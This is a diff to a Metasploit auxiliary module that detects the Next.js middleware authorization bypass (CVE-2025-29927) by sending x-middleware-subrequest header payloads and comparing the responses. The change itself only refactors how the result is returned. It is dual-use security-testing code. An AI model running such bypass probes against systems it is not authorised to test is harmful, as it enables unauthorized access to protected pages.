@@ -104,7 +104,7 @@ class MetasploitModule < Msf::Auxiliary
     res && GATE_CODES.include?(res.code) ? res : nil
   end
 
-  # Returns [payload, bypass_response] for the first payload that defeats the gate,
+  # Returns { payload:, response: } for the first payload that defeats the gate,
   # or nil. Relative to the gated baseline, a bypass is detected when the middleware
   # gate no longer applies: either the response is no longer a gate status (e.g. the
   # protected page is served with 200), or it is still a redirect but to a different
@@ -124,7 +124,7 @@ class MetasploitModule < Msf::Auxiliary
       gate_gone = !GATE_CODES.include?(res.code) && res.code != baseline.code
       redirect_changed = GATE_CODES.include?(res.code) &&
                          (res.code != baseline.code || res.headers['location'].to_s != base_loc)
-      return [payload, res] if gate_gone || redirect_changed
+      return { payload: payload, response: res } if gate_gone || redirect_changed
     end
     nil
   end
@@ -139,7 +139,7 @@ class MetasploitModule < Msf::Auxiliary
     hit = bypassing_payload(baseline)
     return Exploit::CheckCode::Safe("#{target_uri.path} gated (#{describe_response(baseline)}); not bypassed") if hit.nil?
 
-    Exploit::CheckCode::Vulnerable("Middleware bypassed: #{describe_response(baseline)} -> #{describe_response(hit[1])} with '#{hit[0]}'")
+    Exploit::CheckCode::Vulnerable("Middleware bypassed: #{describe_response(baseline)} -> #{describe_response(hit[:response])} with '#{hit[:payload]}'")
   end
 
   def run_host(_ip)
@@ -156,12 +156,12 @@ class MetasploitModule < Msf::Auxiliary
       return
     end
 
-    print_good("#{peer} - Next.js middleware authorization bypass confirmed (CVE-2025-29927): #{describe_response(baseline)} -> #{describe_response(hit[1])} with x-middleware-subrequest '#{hit[0]}'")
+    print_good("#{peer} - Next.js middleware authorization bypass confirmed (CVE-2025-29927): #{describe_response(baseline)} -> #{describe_response(hit[:response])} with x-middleware-subrequest '#{hit[:payload]}'")
     report_vuln(
       host: rhost,
       port: rport,
       name: name,
-      info: "x-middleware-subrequest bypass on #{target_uri.path}; #{describe_response(baseline)} -> #{describe_response(hit[1])}",
+      info: "x-middleware-subrequest bypass on #{target_uri.path}; #{describe_response(baseline)} -> #{describe_response(hit[:response])}",
       refs: references
     )
   end
